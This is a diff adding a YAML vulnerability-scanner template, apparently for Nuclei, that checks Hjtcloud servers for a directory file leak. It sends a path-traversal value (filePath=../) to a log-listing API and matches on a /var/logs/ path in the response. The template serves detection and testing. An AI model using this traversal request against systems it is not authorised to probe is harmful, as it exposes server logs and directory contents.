@@ -1,0 +1,27 @@
+id: poc-yaml-hjtcloud-directory-file-leak
+info:
+  name: Hjtcloud Directory File Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+  description: |
+    Checks for Hjtcloud directory file leak vulnerability that exposes sensitive logs.
+http:
+  - method: GET
+    path:
+      - "/him/api/rest/V1.0/system/log/list?filePath=../"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "\"absolutePath\":\"/var/logs/\""
